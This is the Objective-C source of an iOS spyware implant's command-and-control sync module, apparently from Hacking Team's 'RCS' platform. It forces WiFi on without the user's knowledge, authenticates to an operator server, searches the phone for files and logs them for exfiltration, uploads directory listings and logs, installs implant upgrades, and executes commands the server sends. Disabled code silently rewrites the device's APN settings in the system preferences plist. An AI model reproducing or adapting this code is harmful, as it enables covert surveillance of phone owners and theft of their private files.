/*
 * RCSMac - RESTNetworkProtocol
 *  Implementation for REST Protocol.
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <notify.h>

#import "RESTNetworkProtocol.h"
#import "RESTTransport.h"

#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ConfNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "UploadNetworkOperation.h"
#import "UpgradeNetworkOperation.h"
#import "FSNetworkOperation.h"
#import "LogNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "CommandsNetworkOperation.h"

#import "RCSICommon.h"
#import "RCSIFileSystemManager.h"
//#import "RCSITaskManager.h"
#import "UIDevice+machine.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"

//#define DEBUG_PROTO
#define infoLog NSLog
#define errorLog NSLog
#define warnLog NSLog

typedef struct _sync {
  u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
  u_int wifiFlag;
  u_int serverHostLength;
  wchar_t serverHost[256];
} syncStruct;

typedef struct _ApnStruct {
  u_int serverHostLength;
  wchar_t *serverHost;
  u_int numAPN;
  u_int mcc;        // Mobile Country Code
  u_int mnc;        // Mobile Network Code
  u_int apnLen;     // apn host len
  unichar *apn;     // apn host null-terminated
  u_int apnUserLen; // apn username len
  unichar *apnUser; // apn username null-terminated
  u_int apnPassLen; // apn password len
  unichar *apnPass; // apn password null-terminated
} syncAPNStruct;

@implementation RESTNetworkProtocol

- (id)initWithConfiguration: (NSData *)aConfiguration
                    andType: (u_int)aType
{
  if ((self = [super init]))
    {
      if (aConfiguration == nil)
        {
#ifdef DEBUG_PROTO
          errorLog(@"configuration is nil");
#endif
          
          return nil;
        }
      
#ifdef DEBUG_PROTO
      NSLog(@"configuration: %@", aConfiguration);
#endif

      NSString *host;
      mUsedAPN    = NO;
      mWifiForced = NO;
    
      if (aType == ACTION_SYNC)
        {
          syncStruct *header  = (syncStruct *)[aConfiguration bytes];

          mWifiForce  = header->wifiFlag;
          mGprsForce  = header->gprsFlag;
//          host = [[NSString alloc] initWithCharacters: (unichar *)header->serverHost
//                                               length: header->serverHostLength / 2 - 1];
            host = [[NSString alloc] initWithBytes: header->serverHost length:header->serverHostLength encoding:NSUTF8StringEncoding];
            
#ifdef DEBUG_PROTO
          infoLog(@"wifi : %d", mWifiForce);
          infoLog(@"gprs : %d", mGprsForce);
#endif
        }
#if 0
      else if (aType == ACTION_SYNC_APN)
        {
          uint32_t offset   = 0;
          uint32_t hostLen  = 0;

          mUsedAPN = YES;

          // host len
          [aConfiguration getBytes: &hostLen
                             range: NSMakeRange(0, sizeof(uint32_t))];
          wchar_t  whost[hostLen];
          offset = 4;
          // host wchar string
          [aConfiguration getBytes: whost
                             range: NSMakeRange(offset, hostLen - 1)];

          uint32_t numAPN = 0;
          uint32_t mcc    = 0;
          uint32_t mnc    = 0;
          uint32_t apnLen = 0;

          offset = 4 + hostLen;
          // number of APNs
          [aConfiguration getBytes: &numAPN
                             range: NSMakeRange(offset, sizeof(uint32_t))];
          offset = 8 + hostLen;
          // mcc
          [aConfiguration getBytes: &mcc
                             range: NSMakeRange(offset, sizeof(uint32_t))];
          offset = 12 + hostLen;
          // mnc
          [aConfiguration getBytes: &mnc
                             range: NSMakeRange(offset, sizeof(uint32_t))];
          offset = 16 + hostLen;
          // apn len
          [aConfiguration getBytes: &apnLen
                             range: NSMakeRange(offset, sizeof(uint32_t))];

          wchar_t  wapn[apnLen];
          offset = 20 + hostLen;
          // apn wchar string
          [aConfiguration getBytes: wapn
                             range: NSMakeRange(offset, apnLen - 1)];

          offset = 20 + hostLen + apnLen;
          uint32_t apnUserLen;
          // apn username len
          [aConfiguration getBytes: &apnUserLen
                             range: NSMakeRange(offset, sizeof(uint32_t))];
          offset = 24 + hostLen + apnLen;
          wchar_t  wapnUser[apnUserLen];
          // apn username wchar string
          [aConfiguration getBytes: wapnUser
                             range: NSMakeRange(offset, apnUserLen - 1)];

          offset = 24 + hostLen + apnLen + apnUserLen;
          uint32_t apnPassLen;
          // apn password len
          [aConfiguration getBytes: &apnPassLen
                             range: NSMakeRange(offset, sizeof(uint32_t))];
          offset = 28 + hostLen + apnLen + apnUserLen;
          wchar_t  wapnPass[apnPassLen];
          // apn password wchar string
          [aConfiguration getBytes: wapnPass
                             range: NSMakeRange(offset, apnPassLen - 1)];

          host = [[NSString alloc] initWithCharacters: (unichar *)whost
                                               length: hostLen / 2 - 1];
          NSString *apn = [[NSString alloc] initWithCharacters: (unichar *)wapn
                                                        length: apnLen / 2 - 1];
          NSString *apnUser = [[NSString alloc] initWithCharacters: (unichar *)wapnUser
                                                            length: apnUserLen / 2 - 1];
          NSString *apnPass = [[NSString alloc] initWithCharacters: (unichar *)wapnPass
                                                            length: apnPassLen / 2 - 1];

#ifdef DEBUG_PROTO
          infoLog(@"apn    : %@", apn);
          infoLog(@"napn   : %d", numAPN);
          infoLog(@"mcc    : %@", mcc);
          infoLog(@"mnc    : %@", mnc);
          infoLog(@"apnUser: %@", apnUser);
          infoLog(@"apnPass: %@", apnPass);
#endif
          if ([self configureAPNWithHost: apn
                                    user: apnUser
                             andPassword: apnPass] == NO)
            {
#ifdef DEBUG_PROTO
              errorLog(@"Error while configuring APN");
#endif
            }
        }
#endif

      NSString *_url;
      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
      mURL    = [[NSURL alloc] initWithString: _url];

#ifdef DEBUG_PROTO
      infoLog(@"URL: %@", mURL);
#endif

      return self;
    }
  
  return nil;
}

// Abstract Class Methods
- (BOOL)perform
{
   
  // Check first what kind of connection we need/have
  BOOL status = [self getAvailableConnection];
  if (status == 0)
    {
#ifdef DEBUG_PROTO
      warnLog(@"No connection available");
#endif
      // No connection, see if we have to force something
      if (mWifiForce)
        {
          // Force Wifi Connection
#ifdef DEBUG_PROTO
          infoLog(@"Forcing WiFi Connection");
#endif
          mWifiForced = YES;
          notify_post("com.apple.Preferences.WiFiOn");

          // Now sleep in order to wait for the wifi connection
          NSString *devModel = [[UIDevice currentDevice] machine];
          if ([devModel isEqualToString: @"iPhone1,2"])
            {
#ifdef DEBUG_PROTO
              infoLog(@"Device is 3G");
#endif
              // iPhone 3G
              sleep(15);
            }
          else
            {
              sleep(5);
            }
        }
      else if (mGprsForce)
        {
          // Force GPRS Connection
#ifdef DEBUG_PROTO
          infoLog(@"Forcing GPRS Connection");
#endif
        }
    }
  else
    {
#ifdef DEBUG_PROTO
      infoLog(@"Connection already available");
#endif
    }
  
  // Init the transport
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
                                  initWithTransport: transport];
  
  if ([authOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on AUTH");
#endif
      
      if (mWifiForced)
        {
          notify_post("com.apple.Preferences.WiFiOff");
        }

      // If we have synced with custom APN, restore the phone at its original
      // settings
#if 0
      if (mUsedAPN)
        {
          [self configureAPNWithHost: mOrigAPNHost
                                user: mOrigAPNUser
                         andPassword: mOrigAPNPass];
        }
#endif
    
      return NO;
    }

  
  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([idOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on ID");
#endif
   
      if (mWifiForced)
        {
          notify_post("com.apple.Preferences.WiFiOff");
        }
    
      // If we have synced with custom APN, restore the phone at its original
      // settings
#if 0
      if (mUsedAPN)
        {
          [self configureAPNWithHost: mOrigAPNHost
                                user: mOrigAPNUser
                         andPassword: mOrigAPNPass];
        }
#endif

      return NO;
    }
  
  NSMutableArray *commandList = [idOP getCommands];
  
#ifdef DEBUG_PROTO
  infoLog(@"commands available: %@", commandList);
#endif
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      uint32_t command = [[commandList objectAtIndex: i] unsignedIntValue];
      
      switch (command)
        {
        case PROTO_DOWNLOAD:
          {
            DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                initWithTransport: transport];
            if ([downOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on DOWNLOAD");
#endif
              }
            else
              {
                NSArray *files = [downOP getDownloads];
                
                if ([files count] > 0)
                  {
                    _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
                    
                    for (NSString *fileMask in files)
                      {
#ifdef DEBUG_PROTO
                        infoLog(@"(PROTO_DOWNLOAD) Logging %@", fileMask);
#endif
                        
                        NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
                        if (filesFound == nil)
                          {
#ifdef DEBUG_PROTO
                            errorLog(@"fileMask (%@) didn't match any files", fileMask);
#endif
                            continue;
                          }
                        
                        for (NSString *file in filesFound)
                          {
#ifdef DEBUG_PROTO
                            infoLog(@"createLogForFile (%@)", file);
#endif
                            [fsManager logFileAtPath: file];
                          }
                      }
  
                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(@"(PROTO_DOWNLOAD) no file available");
#endif
                  }
              }

          } break;
        case PROTO_UPLOAD:
          {
            UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                            initWithTransport: transport];
            
            if ([upOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on UPLOAD");
#endif
              }

          } break;
        case PROTO_UPGRADE:
          {
            UpgradeNetworkOperation *upgradeOP = [[UpgradeNetworkOperation alloc]
                                                  initWithTransport: transport];
            
            if ([upgradeOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on UPGRADE");
#endif
              }

          } break;
        case PROTO_FILESYSTEM:
          {
            FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
                                        initWithTransport: transport];
            if ([fsOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on FS");
#endif
              }
            else
              {
                NSArray *paths = [fsOP getPaths];
#ifdef DEBUG_PROTO
                infoLog(@"paths: %@", paths);
#endif
                
                if ([paths count] > 0)
                  {
                    _i_FileSystemManager *fsManager = [[_i_FileSystemManager alloc] init];
                    
                    for (NSDictionary *dictionary in paths)
                      {
                        NSString *path = [dictionary objectForKey: @"path"];
                        uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
                        
#ifdef DEBUG_PROTO
                        infoLog(@"(PROTO_FS) path : %@", path);
                        infoLog(@"(PROTO_FS) depth: %d", depth);
#endif
                        
                        [fsManager logDirContent: path
                                       withDepth: depth];
                      }

                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(@"(PROTO_FS) no path availalble");
#endif
                  }
              }

          } break;
        case PROTO_COMMANDS:
          {
            CommandsNetworkOperation *commOP = [[CommandsNetworkOperation alloc] initWithTransport: transport];
            
            if ([commOP perform] == NO)
            {
#ifdef DEBUG_PROTO
              errorLog(@"Error on COMMANDS");
#endif
            }
            else
            {
              [commOP executeCommands];
            }
            
          } break;
        default:
          {
#ifdef DEBUG_PROTO
            errorLog(@"Received an unknown command (%d)", command);
#endif
          } break;
        }
    }
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport];
  
  if ([logOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on LOG");
#endif
    }

  
  ByeNetworkOperation *byeOP = [[ByeNetworkOperation alloc]
                                initWithTransport: transport];
  if ([byeOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"WTF error on BYE?!");
#endif
    }
  
  if (mWifiForced)
    {
      notify_post("com.apple.Preferences.WiFiOff");
    }

  // If we have synced with custom APN, restore the phone at its original
  // settings
#if 0
  if (mUsedAPN)
    {
      [self configureAPNWithHost: mOrigAPNHost
                            user: mOrigAPNUser
                     andPassword: mOrigAPNPass];
    }
#endif
  
  
//  if ([[_i_ConfManager sharedInstance] mShouldReloadConfiguration] == YES)
//    {
//      [[_i_ConfManager sharedInstance] sendReloadNotification];
//      [[_i_ConfManager sharedInstance] setMShouldReloadConfiguration: NO];
//    }
  

  return YES;
}
// End Of Abstract Class Methods

- (BOOL)getAvailableConnection
{
//  Reachability *reachability   = [Reachability reachabilityForInternetConnection];
//  BOOL internetStatus = [reachability currentReachabilityStatus];
//  
//  return internetStatus;
    return true;
}

#if 0
- (BOOL)configureAPNWithHost: (NSString *)host
                        user: (NSString *)username
                 andPassword: (NSString *)password
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  NSString *err = nil;
  NSString *plistPath = @"/private/var/preferences/SystemConfiguration/preferences.plist";
  
  NSData *prefData = [[NSFileManager defaultManager] contentsAtPath: plistPath];
  if (prefData == nil)
    {
#ifdef DEBUG_PROTO
      NSLog(@"Error while opening file %@", plistPath);
#endif
      return NO;
    }
  
  NSDictionary *prefOriginDict = 
  (NSDictionary *)[NSPropertyListSerialization propertyListFromData: prefData
                                                   mutabilityOption: NSPropertyListMutableContainersAndLeaves 
                                                             format: nil  
                                                   errorDescription: &err];
  if (prefOriginDict == nil)
    {
#ifdef DEBUG_PROTO
      NSLog(@"Error while getting content of file %@", plistPath);
#endif
      return NO;
    }

  NSMutableDictionary *prefDict = [prefOriginDict mutableCopy];
  NSArray *keys = [prefDict allKeys];

  unsigned char signature[] = "\x7e\x59\x52\x65\x13\xcc\xcf\x8c\x2d\x4a\xab"
                              "\x10\xf8\xd0\x31\x8c\x49\x95\xd4\xf8\x38\x20"
                              "\xb7\xa7\x26\xab\xcb\xb7\xd5\x60\x77\x99\x70"
                              "\x36\xd9\x36\x68\x87\xa5\xa5\x58\xc5\xfe\x71"
                              "\x47\x99\x28\x6c\xd4\x82\xcd\x03\xc4\x25\x01"
                              "\xa6\x58\x5a\x14\x35\x6e\x97\xdf\x7c\x8c\xae"
                              "\x14\x4e\x78\x8d\x96\x20\x57\x87\x19\x34\x32"
                              "\x94\xba\xe4\xf5\x2e\xd8\x59\x25\x49\x8b\x75"
                              "\xf4\x7c\xfa\x3c\xa4\x80\x5f\x57\xde\xa0\xa6"
                              "\x37\x3b\x39\x98\x81\x66\x9f\xee\xee\x76\xd4"
                              "\xd5\xb7\x5f\x6a\x69\xf2\x98\xde\x38\xd9\xbf"
                              "\xdb\x07\xbb\xde\xf0\x90\x27";
  NSData *sign = [[NSData alloc] initWithBytes: signature
                                        length: sizeof(signature) - 1];
  BOOL found = NO;

  for (NSString *key in keys)
    {
      if ([key isEqualToString: @"NetworkServices"])
        {
          NSMutableDictionary *value = (NSMutableDictionary *)[prefDict objectForKey: key];
          
          if (value != nil)
            {
              for (NSString *tmp1 in value)
                {
                  NSMutableDictionary *tmpDict1 = (NSMutableDictionary *)[value objectForKey: tmp1];
                  for (NSString *tmp2 in tmpDict1)
                    {
                      if ([tmp2 isEqualToString: @"com.apple.CommCenter"])
                        {
                          NSMutableDictionary *tmpDict2 = (NSMutableDictionary *)[tmpDict1 objectForKey: tmp2];
                          for (NSString *tmp3 in tmpDict2)
                            {
                              if ([tmp3 isEqualToString: @"Setup"])
                                {
                                  NSMutableDictionary *tmpDict3 = (NSMutableDictionary *)[tmpDict2 objectForKey: tmp3];
                                  NSData *plistSignature = (NSData *)[tmpDict3 objectForKey: @"signature"];

                                  if ([plistSignature isEqualToData: sign])
                                    {
#ifdef DEBUG_PROTO
                                      NSLog(@"Found the correct setup dictionary");
                                      NSLog(@"%@", tmpDict3);
#endif
                                      if ([tmpDict3 objectForKey: @"apn"] != @""
                                       && [tmpDict3 objectForKey: @"apn"] != nil)
                                        {
                                          mOrigAPNHost = [[tmpDict3 objectForKey: @"apn"] copy];
                                        }
                                      else
                                        {
                                          mOrigAPNHost = [[NSString alloc] initWithString: @""];
                                        }

                                      if ([tmpDict3 objectForKey: @"username"] != @""
                                       && [tmpDict3 objectForKey: @"username"] != nil)
                                        {
                                          mOrigAPNUser = [[tmpDict3 objectForKey: @"username"] copy];
                                        }
                                      else
                                        {
                                          mOrigAPNUser = [[NSString alloc] initWithString: @""];
                                        }

                                      if ([tmpDict3 objectForKey: @"password"] != @""
                                       && [tmpDict3 objectForKey: @"password"] != nil)
                                        {
                                          mOrigAPNPass = [[tmpDict3 objectForKey: @"password"] copy];
                                        }
                                      else
                                        {
                                          mOrigAPNPass = [[NSString alloc] initWithString: @""];
                                        }

                                      [tmpDict3 setObject: host
                                                   forKey: @"apn"];
                                      [tmpDict3 setObject: username
                                                   forKey: @"username"];
                                      [tmpDict3 setObject: password
                                                   forKey: @"password"];
                                      [tmpDict2 setObject: tmpDict3
                                                   forKey: tmp3];
                                      [tmpDict1 setObject: tmpDict2
                                                   forKey: tmp2];
                                      [value setObject: tmpDict1
                                                forKey: tmp1];
                                      [prefDict setObject: value
                                                   forKey: key];
                                      NSString *err = nil;
                                      NSData *dataOut = [NSPropertyListSerialization
                                        dataFromPropertyList: prefDict
                                                      format: NSPropertyListBinaryFormat_v1_0
                                            errorDescription: &err];

                                      [dataOut writeToFile: plistPath
                                                atomically: YES];
                                      found = YES;
                                      break;
                                    }
                                }

                              if (found)
                                {
                                  break;
                                }
                            }
                        }

                      if (found)
                        {
                          break;
                        }
                    }

                  if (found)
                    {
                      break;
                    }
                }
            }
        }

      if (found)
        {
          break;
        }
    }
  
  [sign release];
  [outerPool release];

  return found;
}
#endif

@end
